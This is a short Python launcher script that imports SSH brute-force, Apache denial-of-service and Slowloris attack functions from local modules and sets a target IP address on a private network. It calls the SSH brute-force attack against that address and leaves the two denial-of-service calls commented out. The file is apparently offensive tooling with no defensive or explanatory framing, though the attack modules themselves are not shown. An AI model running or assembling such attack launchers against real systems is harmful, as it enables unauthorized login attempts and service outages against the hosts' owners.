from __future__ import absolute_import

from brute_force_ssh import run_brute_force_ssh
from dos_apache2 import run_dos_apache
from slowloris import run_slow_loris

IP_TO_ATTACK = "192.168.0.13"

run_brute_force_ssh(ip=IP_TO_ATTACK)
#run_dos_apache(url="http://{}:80/".format(IP_TO_ATTACK))
#run_slow_loris(ip=IP_TO_ATTACK)
